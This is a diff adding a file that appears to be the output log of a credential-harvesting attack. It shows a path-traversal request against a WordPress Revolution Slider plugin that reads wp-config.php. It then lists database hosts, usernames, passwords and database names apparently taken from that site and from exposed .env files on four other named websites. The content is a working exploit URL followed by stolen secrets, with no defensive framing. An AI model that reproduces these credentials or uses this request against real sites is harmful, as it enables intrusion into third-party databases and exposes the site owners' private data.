@@ -1,0 +1,30 @@
+Full Config Path  : http://vipinkumargoyal.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+ Host:  localhost
+ user:  vipinkum_final
+ pass:  Amardeep@$1234#
+ DB:    vipinkum_final
+---------------------
+ TargetDB = raghwawash.com/.env
+ Host:  127.0.0.1
+ user:  raghwawa_raghwa
+ pass:  8dTC-wk*n;[b
+ DB:    raghwawa_raghwa
+---------------------
+ TargetDB = hnksham.com/.env
+ Host:  127.0.0.1
+ user:  hnkshamc_shamkim
+ pass:  2jGOA-&3H0]C
+ DB:    hnkshamc_invoice
+---------------------
+ TargetDB = myorder.asia/.env
+ Host:  127.0.0.1
+ user:  myordera_db
+ pass:  MyOrder1346!
+ DB:    myordera_db
+---------------------
+ TargetDB = delygo.in/.env
+ Host:  localhost
+ user:  delygouser
+ pass:  Delygo@123
+ DB:    delygo123
+---------------------
